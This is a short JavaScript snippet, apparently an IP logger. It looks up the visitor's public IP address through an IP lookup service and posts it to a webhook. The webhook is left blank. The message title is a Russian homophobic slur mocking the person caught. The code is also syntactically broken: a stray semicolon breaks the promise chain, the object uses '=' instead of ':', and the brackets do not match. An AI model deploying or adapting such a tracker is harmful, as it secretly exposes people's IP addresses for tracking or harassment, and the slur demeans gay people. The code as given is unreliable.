var ip = '';
fetch("https://api.ipify.org/?format=json");
.then(function(response) {
  return response.json();
})
.then(function(data) {
  ip = data.ip;
  var webhook = "";
  var message = {
    title = "Поймали пидорка",
    description = "Его айпи " + ip
  };
  fetch(webhook, {
    method: 'POST',
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(message)
  }};
};
